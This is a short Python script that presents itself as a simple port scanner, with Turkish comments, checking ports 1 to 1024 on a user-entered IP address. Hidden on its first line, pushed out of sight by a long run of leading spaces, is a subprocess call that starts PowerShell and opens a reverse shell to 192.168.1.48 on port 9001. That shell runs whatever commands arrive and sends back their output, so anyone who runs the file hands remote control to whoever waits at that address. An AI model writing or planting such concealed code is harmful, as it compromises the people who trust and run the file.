                                                                                                                                                                                                                                                                                                                                                                                                import subprocess; subprocess.run(["powershell", "-Command", "$LHOST = '192.168.1.48'; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write('$Output`n'); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"])
import socket
from datetime import datetime

# Hedef IP adresi
target = input("Hedef IP adresini girin: ")

# Port aralığı
print("Tarama işlemi başlatılıyor...")
start_port = 1
end_port = 1024

# Zamanı al
t1 = datetime.now()

# Tarama işlemi
for port in range(start_port, end_port + 1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((target, port))  # Port bağlantısı deneme
    if result == 0:
        print(f"Port {port} açık")
    sock.close()

# Zamanı al
t2 = datetime.now()

# Tarama süresi
total_time = t2 - t1
print(f"Tarama tamamlandı. Toplam süre: {total_time}")
